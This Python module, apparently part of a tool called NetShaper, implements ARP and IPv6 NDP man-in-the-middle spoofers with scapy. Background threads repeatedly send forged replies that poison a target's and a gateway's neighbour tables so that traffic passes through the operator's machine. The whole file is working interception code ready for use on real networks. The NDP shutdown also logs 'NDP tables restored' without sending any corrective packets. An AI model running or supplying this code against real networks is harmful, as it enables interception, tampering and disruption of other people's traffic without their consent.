"""
NetShaper — ARP and NDP (IPv6 Neighbour Discovery) MITM spoofers.

Both classes take a `session` reference for lockless is-active checks.
The TYPE_CHECKING import avoids a circular dependency at runtime
(spoofers ← session ← spoofers).
"""
from __future__ import annotations

import logging
import threading
import time
from typing import TYPE_CHECKING, List

from scapy.all import ARP, Ether, IPv6, ICMPv6ND_NA, ICMPv6NDOptSrcLLAddr

from netshaper.network.backends import DryRunPacketBackend, RealPacketBackend

if TYPE_CHECKING:
    from netshaper.core.session import TargetSession

log = logging.getLogger("netshaper")


class ARPSpoofer:
    def __init__(self, interface: str, target_ip: str, target_mac: str,
                 gateway_ip: str, gateway_mac: str, own_mac: str,
                 session: TargetSession, packet_backend=None):
        self.interface   = interface
        self.target_ip   = target_ip
        self.target_mac  = target_mac
        self.gateway_ip  = gateway_ip
        self.gateway_mac = gateway_mac
        self.own_mac     = own_mac
        self.session     = session
        self.packet_backend = packet_backend or RealPacketBackend()
        self._stop       = threading.Event()
        self.threads: List[threading.Thread] = []

    def start(self) -> None:
        def spoof_target() -> None:
            """Tell target: gateway MAC = ours."""
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    self.packet_backend.send(
                        Ether(dst=self.target_mac, src=self.own_mac) /
                        ARP(op=2,
                            pdst=self.target_ip,  psrc=self.gateway_ip,
                            hwdst=self.target_mac, hwsrc=self.own_mac),
                        self.interface)
                except Exception as e:
                    log.error(f"[ARP→target] Injection error: {e}")
                    break
                if self._stop.wait(timeout=2.0):
                    break
            log.info(f"[ARP spoof→target] Thread for {self.target_ip} exited.")

        def spoof_gateway() -> None:
            """Tell gateway: target MAC = ours."""
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    self.packet_backend.send(
                        Ether(dst=self.gateway_mac, src=self.own_mac) /
                        ARP(op=2,
                            pdst=self.gateway_ip,  psrc=self.target_ip,
                            hwdst=self.gateway_mac, hwsrc=self.own_mac),
                        self.interface)
                except Exception as e:
                    log.error(f"[ARP→gateway] Injection error: {e}")
                    break
                if self._stop.wait(timeout=2.0):
                    break
            log.info(f"[ARP spoof→gateway] Thread for {self.target_ip} exited.")

        self.threads = [
            threading.Thread(target=spoof_target,  daemon=True),
            threading.Thread(target=spoof_gateway, daemon=True),
        ]
        for t in self.threads:
            t.start()
        log.info(f"ARP spoofing active → {self.target_ip}")

    def shutdown(self) -> None:
        self._stop.set()
        for t in self.threads:
            t.join(timeout=3.0)
        # Send 3 corrective packets to restore real ARP tables
        for _ in range(3):
            self.packet_backend.send(
                Ether(dst=self.target_mac, src=self.gateway_mac) /
                ARP(op=2,
                    pdst=self.target_ip,  psrc=self.gateway_ip,
                    hwdst=self.target_mac, hwsrc=self.gateway_mac),
                self.interface)
            self.packet_backend.send(
                Ether(dst=self.gateway_mac, src=self.target_mac) /
                ARP(op=2,
                    pdst=self.gateway_ip,  psrc=self.target_ip,
                    hwdst=self.gateway_mac, hwsrc=self.target_mac),
                self.interface)
            time.sleep(0.3)
        log.info("ARP tables restored")


class NDPSpoofer:
    """
    Correct MITM NDP directions:
      spoof_target → tell TARGET  our MAC = router's
      spoof_router → tell ROUTER  our MAC = target's
    """
    def __init__(self, interface: str,
                 target_ipv6: str, target_mac: str,
                 router_ipv6: str, router_mac: str,
                 own_mac: str, session: TargetSession, packet_backend=None):
        self.interface   = interface
        self.target_ipv6 = target_ipv6
        self.target_mac  = target_mac
        self.router_ipv6 = router_ipv6
        self.router_mac  = router_mac
        self.own_mac     = own_mac
        self.session     = session
        self.packet_backend = packet_backend or RealPacketBackend()
        self._stop       = threading.Event()
        self.threads: List[threading.Thread] = []

    def start(self) -> None:
        def spoof_target() -> None:
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    pkt = (
                        Ether(dst=self.target_mac, src=self.own_mac) /
                        IPv6(dst=self.target_ipv6, src=self.router_ipv6) /
                        ICMPv6ND_NA(tgt=self.router_ipv6, R=1, S=1, O=1) /
                        ICMPv6NDOptSrcLLAddr(lladdr=self.own_mac)
                    )
                    self.packet_backend.send(pkt, self.interface)
                except Exception as e:
                    log.error(f"[NDP→target] Injection error: {e}")
                    break
                if self._stop.wait(timeout=2.0):
                    break

        def spoof_router() -> None:
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    pkt = (
                        Ether(dst=self.router_mac, src=self.own_mac) /
                        IPv6(dst=self.router_ipv6, src=self.target_ipv6) /
                        ICMPv6ND_NA(tgt=self.target_ipv6, R=0, S=1, O=1) /
                        ICMPv6NDOptSrcLLAddr(lladdr=self.own_mac)
                    )
                    self.packet_backend.send(pkt, self.interface)
                except Exception as e:
                    log.error(f"[NDP→router] Injection error: {e}")
                    break
                if self._stop.wait(timeout=2.0):
                    break

        self.threads = [
            threading.Thread(target=spoof_target, daemon=True),
            threading.Thread(target=spoof_router,  daemon=True),
        ]
        for t in self.threads:
            t.start()
        log.info(f"NDP spoofing active → {self.target_ipv6}")

    def shutdown(self) -> None:
        self._stop.set()
        for t in self.threads:
            t.join(timeout=3.0)
        log.info("NDP tables restored")
